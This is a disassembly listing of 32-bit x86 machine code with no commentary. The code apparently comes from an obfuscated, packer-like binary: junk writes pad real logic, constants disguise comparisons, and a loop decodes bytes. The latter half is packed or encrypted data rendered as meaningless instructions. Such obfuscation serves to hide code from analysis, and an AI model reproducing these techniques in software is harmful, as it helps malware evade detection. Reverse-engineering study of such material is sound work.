  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42aa17
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx+0x58bd524a],al
  421ace:	ret    0xa43c
  421ad1:	outs   dx,DWORD PTR ds:[esi]
  421ad2:	mov    dh,0x82
  421ad4:	sbb    DWORD PTR [edx+0x60],0xffffff83
  421ad8:	adc    DWORD PTR [eax+0x2ff41e65],0xffffff84
  421adf:	outs   dx,DWORD PTR ds:[esi]
  421ae0:	or     esp,DWORD PTR [ebx]
  421ae2:	in     al,dx
  421ae3:	push   es
  421ae4:	(bad)  
  421ae5:	mov    al,0x22
  421ae7:	xor    cl,BYTE PTR [edi-0x709b34e8]
  421aed:	push   ss
  421aee:	arpl   WORD PTR [edx+0x5d9f923],cx
  421af4:	(bad)  
  421af6:	cmp    DWORD PTR [esi],edx
  421af8:	aas    
  421af9:	shr    BYTE PTR [ecx+0x65dbeebf],1
  421aff:	cmp    edx,DWORD PTR [ebp+0x1d]
  421b02:	stos   BYTE PTR es:[edi],al
  421b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b04:	addr16 repnz mov eax,0x9480db9e
  421b0b:	adc    DWORD PTR [edi-0x2b7af8e3],ebp
  421b11:	sbb    BYTE PTR [esi],bl
  421b13:	fidiv  WORD PTR [eax+0x2]
  421b16:	sbb    DWORD PTR [eax+edi*8-0x4c7a1cb2],esi
  421b1d:	out    0x5b,eax
  421b1f:	push   0xffffffb8
  421b21:	inc    esi
  421b22:	cmp    al,0xfc
  421b24:	push   ecx
  421b25:	loope  0x421af1
  421b27:	sub    eax,0x98314992
  421b2c:	sti    
  421b2d:	mov    dh,bl
  421b2f:	fnstcw WORD PTR [ebx+ecx*1+0x50]
  421b33:	popf   
  421b34:	outs   dx,DWORD PTR ds:[esi]
  421b35:	mov    ah,0x84
  421b37:	test   eax,0x22ee02f0
  421b3c:	popa   
  421b3d:	push   eax
  421b3e:	(bad)  
  421b3f:	iret   
  421b40:	or     al,0xed
  421b42:	sbb    DWORD PTR ds:0x295c2d9c,0x56
  421b49:	jmp    0xa59aa203
  421b4e:	or     DWORD PTR [ecx],esi
  421b50:	and    edi,edi
  421b52:	adc    ecx,ebx
  421b54:	pop    edi
  421b55:	cld    
  421b56:	stos   BYTE PTR es:[edi],al
  421b57:	jp     0x421b16
  421b59:	idiv   esp
  421b5b:	pushf  
  421b5c:	imul   edx,DWORD PTR [esi-0x1b],0x707c8535
  421b63:	loopne 0x421b8a
  421b65:	clc    
  421b66:	jge    0x421ba6
  421b68:	or     BYTE PTR [ecx+0x18],dh
  421b6b:	stc    
  421b6c:	cwde   
  421b6d:	ror    BYTE PTR [ebx-0x79],0xad
  421b71:	mov    edi,0x2fb465b6
  421b76:	not    BYTE PTR [edx+0x4a]
  421b79:	and    eax,0x6eaeb983
  421b7e:	sti    
  421b7f:	jmp    0x13a2d8a3
  421b84:	adc    eax,0x52063763
  421b89:	pop    esi
  421b8a:	sub    dl,ch
  421b8c:	ins    DWORD PTR es:[edi],dx
  421b8d:	jge    0x421bdf
  421b8f:	fisubr WORD PTR [esi+0x63]
  421b92:	cwde   
  421b93:	xchg   BYTE PTR [eax],cl
  421b95:	div    dh
  421b97:	in     al,dx
  421b98:	je     0x421b59
  421b9a:	cli    
  421b9b:	clc    
  421b9c:	arpl   WORD PTR [ebp-0x1ae7f47d],cx
  421ba2:	xor    al,0x9f
  421ba4:	jl     0x421ba6
  421ba6:	fist   WORD PTR [esi+eax*4+0x193fe56c]
  421bad:	mov    bh,0xcc
  421baf:	xchg   edx,eax
  421bb0:	bound  esp,QWORD PTR [edi-0x43]
  421bb3:	mov    bh,0x35
  421bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bb6:	add    cl,BYTE PTR [esi-0x3]
  421bb9:	xchg   ecx,eax
  421bba:	div    BYTE PTR [edx+0x60]
  421bbd:	enter  0x91e9,0x5a
  421bc1:	mov    eax,0xa9a6478a
  421bc6:	cmp    BYTE PTR [ecx],cl
  421bc8:	xor    eax,0x3d448ef0
  421bcd:	mov    ecx,0x95ba716d
  421bd2:	sbb    eax,DWORD PTR [ecx]
  421bd4:	dec    ecx
  421bd5:	xor    eax,0x4584c17b
  421bda:	les    edx,FWORD PTR [eax+0x39]
  421bdd:	nop
  421bde:	fst    QWORD PTR [eax+0x13214e8f]
  421be4:	lods   eax,DWORD PTR ds:[esi]
  421be5:	xchg   BYTE PTR [edx+0x599dd26b],dh
  421beb:	pop    ecx
  421bec:	shl    DWORD PTR [edi+0x2b7234fd],cl
  421bf2:	adc    al,0xe4
  421bf4:	lahf   
  421bf5:	iret   
  421bf6:	shl    BYTE PTR [edi+0x1dc5de59],cl
  421bfc:	dec    esp
  421bfd:	into   
  421bfe:	in     al,0xbe
  421c00:	in     eax,dx
  421c01:	ret    0x2401
  421c04:	fnstsw WORD PTR ss:[edx+0x65a5bd3a]
  421c0b:	out    0x98,eax
  421c0d:	in     eax,dx
  421c0e:	fdivr  DWORD PTR [esi+0x3]
  421c11:	ds aad 0x7e
  421c14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c15:	push   0x31
  421c17:	push   ds
  421c18:	inc    ebp
  421c19:	sbb    DWORD PTR [ebx-0x40],ecx
  421c1c:	ret    0x98b9
  421c1f:	jne    0x421c8b
  421c21:	test   al,0x2e
  421c23:	and    DWORD PTR [ecx],ebx
  421c25:	fs dec eax
  421c27:	push   eax
  421c28:	jbe    0x421c37
  421c2a:	fmul   DWORD PTR [ebp-0xd]
  421c2d:	aad    0x47
  421c2f:	jo     0x421bb5
  421c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c32:	sub    al,0x90
  421c34:	cwde   
  421c35:	dec    eax
  421c36:	xchg   ecx,eax
  421c37:	test   DWORD PTR [edx-0x63],esi
  421c3a:	aam    0xb0
  421c3c:	push   ebx
  421c3d:	xchg   ebx,eax
  421c3e:	and    eax,0xf19ab5b
  421c43:	jp     0x421c43
  421c45:	and    eax,0xd52dfb4f
  421c4a:	pushf  
  421c4b:	sbb    esi,DWORD PTR [eax]
  421c4d:	and    ah,ch
  421c4f:	lahf   
  421c50:	or     al,0xf8
  421c52:	push   ecx
  421c53:	pop    cx
  421c55:	pushf  
  421c56:	or     DWORD PTR [ecx+0x64],edi
  421c59:	mov    DWORD PTR [ebp+edx*4-0x3d],edx
  421c5d:	or     DWORD PTR [ebp-0x77],esi
  421c60:	mov    ch,0xc0
  421c62:	cmp    bl,ch
  421c64:	jae    0x421c6a
  421c66:	and    al,0x1c
  421c68:	(bad)  
  421c69:	fistp  QWORD PTR [ecx-0x5f809f26]
  421c6f:	stc    
  421c70:	cmp    BYTE PTR [edi+0x6f],cl
  421c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c74:	call   0x88e3:0x20c314e0
  421c7b:	mov    dl,0x99
  421c7d:	fistp  QWORD PTR [esi]
  421c7f:	lock lods al,BYTE PTR ds:[esi]
  421c81:	rol    dl,0x4
  421c84:	xchg   ebp,eax
  421c85:	mov    ah,0x15
  421c87:	push   ebx
  421c88:	mov    dh,0xb5
  421c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c8b:	shl    DWORD PTR [ecx],0xc4
  421c8e:	call   0x62ea774e
  421c93:	mov    dl,0xa9
  421c95:	cmp    BYTE PTR [eax-0x73],0xe9
  421c99:	loopne 0x421c5d
  421c9b:	hlt    
  421c9c:	mov    DWORD PTR [ebx],eax
  421c9e:	dec    eax
  421c9f:	scas   eax,DWORD PTR es:[edi]
  421ca0:	mov    WORD PTR [esi-0x7b567852],ss
  421ca6:	and    ebx,DWORD PTR [esi-0x3d6ac0cf]
  421cac:	out    dx,al
  421cad:	sbb    eax,0xa6c11972
  421cb2:	jle    0x421c6b
  421cb4:	test   DWORD PTR [esi+0x8],0x3cbcbae3
  421cbb:	fsub   DWORD PTR [eax-0x17]
  421cbe:	mov    eax,0xbdecc8f1
  421cc3:	xchg   esp,eax
  421cc4:	xchg   BYTE PTR [esi-0x639103fd],ch
  421cca:	imul   esp,ecx,0xffffff83
  421ccd:	sub    DWORD PTR [esp+eiz*2],esp
  421cd0:	retf   
  421cd1:	enter  0xcc46,0xfe
  421cd5:	jnp    0x421c61
  421cd7:	cmp    al,0x6d
  421cd9:	push   ecx
  421cda:	jbe    0x421ca8
  421cdc:	icebp  
  421cdd:	fadd   QWORD PTR [eax+0x25787a42]
  421ce3:	mov    edx,0x22c25a46
  421ce8:	mov    esi,0x91233d69
  421ced:	sub    cl,dh
  421cef:	int3   
  421cf0:	mov    dh,0xa4
  421cf2:	sub    BYTE PTR [edi-0x9576dd3],0x2
  421cf9:	mov    WORD PTR [edi+0x7d4a801a],?
  421cff:	ss push es
  421d01:	(bad)  
  421d02:	sbb    dh,BYTE PTR [ecx+ebp*2+0xb59619]
  421d09:	and    esp,DWORD PTR [edi+0x7b]
  421d0c:	popa   
  421d0d:	and    al,0xc8
  421d0f:	ins    BYTE PTR es:[edi],dx
  421d10:	daa    
  421d11:	int    0x7f
  421d13:	outs   dx,DWORD PTR ds:[esi]
  421d14:	jmp    0x421cfe
  421d16:	aaa    
  421d17:	sbb    BYTE PTR [eax-0x33],ch
  421d1a:	daa    
  421d1b:	dec    edx
  421d1c:	xor    ecx,DWORD PTR [eax+0x103e68e7]
  421d22:	mov    cl,0x8b
  421d24:	push   esp
  421d25:	and    edx,DWORD PTR [ecx+0x52]
  421d28:	stos   BYTE PTR es:[edi],al
  421d29:	inc    edi
  421d2a:	dec    esi
  421d2b:	cmp    DWORD PTR [edx],0x27
  421d2e:	addr16 xor eax,0x8ad12bdf
  421d34:	push   ss
  421d35:	and    DWORD PTR [edi],eax
  421d37:	fldl2t 
  421d39:	jle    0x421d20
  421d3b:	test   BYTE PTR [ebx+0x41ee5a1a],0x5b
  421d42:	test   al,0x78
  421d44:	shl    BYTE PTR [edx+0x9a09fc4],cl
  421d4a:	xchg   edx,eax
  421d4b:	cli    
